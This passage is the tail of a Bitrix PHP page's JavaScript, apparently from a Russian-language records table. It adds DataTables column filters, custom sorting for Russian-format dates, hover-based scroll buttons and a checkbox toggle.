			//Поиск поля "Акт ВР"
			$('#act_vr_filter').on( 'keyup', function () {
				table
					.columns( 9 )
					.search( this.value )
					.draw();
			});

			//Поиск поля "Дата Акт ВР"
			$('#date_act_vr_filter').on( 'keyup', function () {
				table
					.columns( 10 )
					.search( this.value )
					.draw();
			});

        });
		jQuery.extend( jQuery.fn.dataTableExt.oSort, {
		"ruDate-asc": function ( a, b ) {
			var ruDatea = $.trim(a).split('.');
			var ruDateb = $.trim(b).split('.');

			if(ruDatea[2]*1 < ruDateb[2]*1)
				return 1;
			if(ruDatea[2]*1 > ruDateb[2]*1)
				return -1;
			if(ruDatea[2]*1 == ruDateb[2]*1)
				{
				if(ruDatea[1]*1 < ruDateb[1]*1)
					return 1;
				if(ruDatea[1]*1 > ruDateb[1]*1)
					return -1;
				if(ruDatea[1]*1 == ruDateb[1]*1)
					{
					if(ruDatea[0]*1 < ruDateb[0]*1)
						return 1;
					if(ruDatea[0]*1 > ruDateb[0]*1)
						return -1;
					}
					else
						return 0;
				}
		},

		"ruDate-desc": function ( a, b ) {
			var ruDatea = $.trim(a).split('.');
			var ruDateb = $.trim(b).split('.');

			if(ruDatea[2]*1 < ruDateb[2]*1)
				return -1;
			if(ruDatea[2]*1 > ruDateb[2]*1)
				return 1;
			if(ruDatea[2]*1 == ruDateb[2]*1)
				{
				if(ruDatea[1]*1 < ruDateb[1]*1)
					return -1;
				if(ruDatea[1]*1 > ruDateb[1]*1)
					return 1;
				if(ruDatea[1]*1 == ruDateb[1]*1)
					{
					if(ruDatea[0]*1 < ruDateb[0]*1)
						return -1;
					if(ruDatea[0]*1 > ruDateb[0]*1)
						return 1;
					}
					else
						return 0;
				}
		}
	});

    </script>

	<script>
	//Прокрутка таблицы с помощью кнопок
	$(document).ready(function () {

		var container = $('.workarea-content-paddings'),
			widthContainer = container.outerWidth();
			scroll = $('.dataTable.no-footer').width(),
			topTable = $('.workarea-content-paddings').offset().top,
			topTableBody = $('.dataTable.no-footer > tbody').offset().top,
			sumHeaderHeight = topTableBody - topTable;

		/*if(widthContainer > scroll) {
			$('#buttonRightTable').css('display', 'none');
			$('#buttonLeftTable').css('display', 'none');
		} else {
			$('#buttonRightTable').css('display', 'block');
			$('#buttonLeftTable').css('display', 'block');
		}*/

		$('#buttonRightTable').css('top', sumHeaderHeight + "px");
		$('#buttonLeftTable').css('top', sumHeaderHeight + "px");

		$('#buttonRightTable').hover(function() {
			container.animate({
				'scrollLeft': scroll
			},{duration: 4000, queue: false});
		}, function(){
			container.stop();
		});
		$('#buttonLeftTable').hover(function() {
			container.animate({
				'scrollLeft': -scroll
			},{duration: 4000, queue: false});
		}, function(){
			container.stop();
		});

		$(document).scroll(function() {
			var positionScroll = $(window).scrollTop();
			if (positionScroll > 250 && positionScroll < 2550) {
				$('#buttonRightTable').css('transform','translateY(' + (positionScroll-250) +  'px' + ')');
				$('#buttonLeftTable').css('transform','translateY(' + (positionScroll-250) +  'px' + ')');
			}
		});

	});
	</script>
	<script>
	//attestat
		$('#a_filter').on('click', function() {
			if ($('#a_filter').prop('checked')) {
				$('#a_filter').val('checked');
			} else {
				$('#a_filter').val('');
			}
		});

	</script>
<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/footer.php"); ?>
